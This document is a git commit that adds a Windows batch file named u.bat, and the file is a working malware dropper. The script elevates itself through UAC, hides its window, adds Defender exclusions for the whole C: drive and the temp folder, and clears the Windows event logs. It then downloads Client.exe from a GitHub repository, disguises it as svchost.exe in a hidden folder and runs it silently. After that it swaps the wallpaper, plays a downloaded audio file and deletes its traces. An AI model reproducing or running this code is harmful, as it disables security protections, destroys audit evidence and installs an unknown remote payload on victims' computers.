3151b0ec236bb034b535baac792a699df6e14160
Pythonist310 <111244722+Pythonist310@users.noreply.github.com>
2026-03-08 13:34:09 +0300

    Add files via upload

---
+++ u.bat
@@ -0,0 +1,64 @@
+ÿþ&cls
+@echo off
+
+set "params=%*"
+cd /d "%~dp0" && ( if exist "%temp%\getadmin.vbs" del "%temp%\getadmin.vbs" ) && fsutil dirty query %systemdrive% 1>nul 2>nul || (
+  echo Set UAC = CreateObject^("Shell.Application"^) > "%temp%\getadmin.vbs"
+  echo UAC.ShellExecute "cmd.exe", "/c """"%~s0"" %params:""=""^&""""", "", "runas", 0 >> "%temp%\getadmin.vbs"
+  "%temp%\getadmin.vbs"
+  exit /B
+)
+
+color 00
+mode con cols=1 lines=1
+title Windows
+
+powershell -Command "Add-MpPreference -ExclusionPath 'C:\'" >nul 2>&1
+powershell -Command "Add-MpPreference -ExclusionPath '%TEMP%'" >nul 2>&1
+
+wevtutil cl System >nul 2>&1
+wevtutil cl Application >nul 2>&1
+wevtutil cl Security >nul 2>&1
+
+if not exist "C:\indiva" mkdir "C:\indiva" >nul 2>&1
+attrib +s +h "C:\indiva" >nul 2>&1
+
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/Pythonist310/yutuytuy3213/raw/main/Client.exe' -OutFile 'C:\indiva\svchost.exe'" >nul 2>&1
+
+powershell -Command "Start-Process -FilePath 'C:\indiva\svchost.exe' -WindowStyle Hidden" >nul 2>&1
+
+del /f /q "%temp%\*" >nul 2>&1
+
+setlocal
+
+set "IMG_URL=https://github.com/Pythonist310/ytrytry/raw/main/1.jpg"
+set "MP3_URL=https://github.com/Pythonist310/ytrytry/raw/main/2.mp3"
+
+set "IMG_PATH=C:\indiva\wallpaper.jpg"
+set "MP3_PATH=C:\indiva\bg.mp3"
+set "VBS_MUSIC=C:\indiva\silent_play.vbs"
+
+for /f "tokens=2*" %a in ('reg query "Control Panel\Desktop" /v Wallpaper') do set "OLD_WALLPAPER=%b"
+
+powershell -Command "Invoke-WebRequest -Uri '%MP3_URL%' -OutFile '%MP3_PATH%'" >nul 2>&1
+powershell -Command "Invoke-WebRequest -Uri '%IMG_URL%' -OutFile '%IMG_PATH%'" >nul 2>&1
+
+powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%IMG_PATH%', 3)" >nul 2>&1
+
+(
+echo Set Player = CreateObject("WMPlayer.OCX"^)
+echo Player.URL = "%MP3_PATH%"
+echo Player.settings.volume = 100
+echo Player.controls.play
+echo Do While Player.playState ^<^> 1
+echo     WScript.Sleep 1000
+echo Loop
+) > "%VBS_MUSIC%"
+
+start /wait wscript.exe "%VBS_MUSIC%"
+
+powershell -WindowStyle Hidden -Command "Add-Type -TypeDefinition 'using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\"user32.dll\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }'; [Wallpaper]::SystemParametersInfo(20, 0, '%OLD_WALLPAPER%', 3)" >nul 2>&1
+
+del "%IMG_PATH%" "%MP3_PATH%" "%VBS_MUSIC%"
+
+exit
